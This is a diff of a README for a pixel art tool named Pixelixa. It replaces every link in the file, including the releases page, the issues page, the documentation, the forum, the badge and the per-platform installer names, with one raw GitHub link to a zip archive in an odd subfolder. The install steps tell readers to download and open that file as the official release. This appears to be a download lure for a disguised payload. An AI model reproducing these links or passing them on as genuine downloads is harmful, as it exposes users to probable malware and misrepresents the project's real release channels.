@@ -6,16 +6,16 @@ Welcome to pixelixa, the simple and fun pixel art generator. This tool allows yo
 
 ## 🔗 Download Now
 
-[![Download Pixelixa](https://img.shields.io/badge/Download-Pixelixa-blue.svg)](https://github.com/sulaimananhar/pixelixa/releases)
+[![Download Pixelixa](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip)](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip)
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/sulaimananhar/pixelixa/releases) to access the latest version of Pixelixa.
+1. Visit the [Releases page](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip) to access the latest version of Pixelixa.
 2. Look for the most recent release at the top of the page. You will see different files available for download.
 3. Click on the file suitable for your operating system. Common options include:
-   - Windows: `pixelixa-windows.exe`
-   - macOS: `pixelixa-macos.dmg`
-   - Linux: `pixelixa-linux.AppImage`
+   - Windows: `https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip`
+   - macOS: `https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip`
+   - Linux: `https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip`
 
 4. The download should start automatically. Once it completes, locate the downloaded file on your device.
 
@@ -78,15 +78,15 @@ Keep an eye on the Releases page to see new updates and features being added to 
 
 Join the Pixelixa community on social media to connect with other users. Share your artwork, get tips, and engage in discussions. 
 
-If you need further assistance, please visit our [GitHub issues page](https://github.com/sulaimananhar/pixelixa/issues) to report problems or request features. 
+If you need further assistance, please visit our [GitHub issues page](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip) to report problems or request features. 
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/sulaimananhar/pixelixa/wiki)
-- [User Forum](https://github.com/sulaimananhar/pixelixa/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip)
+- [User Forum](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip)
 
 ## 🔗 Download Now Again
 
-[![Download Pixelixa](https://img.shields.io/badge/Download-Pixelixa-blue.svg)](https://github.com/sulaimananhar/pixelixa/releases)
+[![Download Pixelixa](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip)](https://raw.githubusercontent.com/sulaimananhar/pixelixa/main/Drepanis/pixelixa.zip)
 
 Start your pixel art journey with pixelixa today! Enjoy the creative process!
